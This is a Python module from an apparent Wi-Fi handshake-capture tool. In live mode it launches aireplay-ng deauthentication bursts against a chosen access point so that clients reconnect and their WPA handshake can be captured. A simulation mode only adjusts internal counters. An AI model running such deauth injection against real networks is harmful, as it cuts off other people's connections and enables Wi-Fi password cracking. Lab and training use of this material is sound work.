"""Deauthentication frame injection.

Simulation: accelerates the simulated handshake by nudging the EAPOL counter.
Live:       - Linux: invokes aireplay-ng --deauth against the selected BSSID.
            - Windows: Npcap in managed mode cannot inject raw Dot11 frames, so
              we return an instruction that explains the safe alternative
              (disabling/re-enabling a client, or monitor-mode injection).
"""

import random
import shutil
import subprocess

from config import Config
from capture import interfaces, handshake


def capabilities():
    if Config.ENGINE != "live":
        return {"available": False, "mode": "simulated"}
    if interfaces.aircrack_available():
        return {"available": True, "mode": "live"}
    return {"available": False, "mode": "live",
            "reason": "aireplay-ng not installed; Windows managed mode cannot inject."}


def send_deauth(bssid, count=5):
    """Send a deauth burst. Returns a human-readable result summary."""
    if not handshake.is_running():
        return {"ok": False, "detail": "No active capture. Start a capture first."}

    burst = max(1, min(int(count), 50))

    if Config.ENGINE == "live":
        if shutil.which("aireplay-ng"):
            cmd = ["aireplay-ng", "--deauth", str(burst * 3), "-a", bssid,
                   interfaces.current_iface()]
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            handshake._set(deauth_sent=handshake.ACTIVE["deauth_sent"] + burst,
                           deauth_used=True)
            return {"ok": True, "detail": f"Injected {burst * 3} deauth frames via aireplay-ng."}
        return {
            "ok": False,
            "detail": ("Deauth injection not available in live mode on this "
                       "machine (need aireplay-ng with a monitor-mode adapter, "
                       "or Npcap raw 802.11). Simulate a client reconnect "
                       "instead: disconnect then re-enable a client device so "
                       "it performs a fresh 4-way handshake."),
        }

    # Simulation: deauth forces clients to re-associate -> handshake accelerates.
    nudge = random.Random(bssid).randint(1, 3)
    handshake._set(deauth_sent=handshake.ACTIVE["deauth_sent"] + burst,
                   deauth_used=True)
    if handshake.ACTIVE["state"] in (handshake.STATE_LISTENING,
                                     handshake.STATE_DETECTED):
        target = min(handshake.ACTIVE["eapol_messages"] + nudge, 4)
        handshake._set(eapol_messages=target)
        if handshake.ACTIVE["state"] == handshake.STATE_LISTENING:
            handshake._set(state=handshake.STATE_DETECTED)
    return {
        "ok": True,
        "detail": f"Simulated deauth burst: {burst} frames sent to {bssid} "
                  f"(use this in live labs to trigger re-association).",
        "eapol_messages": handshake.ACTIVE["eapol_messages"],
    }